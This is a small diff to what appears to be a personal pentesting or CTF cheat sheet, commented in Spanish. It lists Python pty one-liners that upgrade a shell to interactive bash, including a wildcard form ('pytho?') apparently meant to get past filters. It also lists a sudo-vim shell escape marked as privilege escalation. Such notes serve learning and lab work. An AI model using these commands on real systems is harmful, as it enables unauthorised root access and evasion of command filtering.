@@ -1,8 +1,9 @@
 
 ```zsh
 # este comando se ralla con vim
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-python -c 'import pty; pty.spawn("/bin/bash")'
+/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
+/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
+/usr/bin/pytho? -c 'import pty; pty.spawn("/bin/bash")'
 #privesc
 sudo vim
 :!sh or :!bash
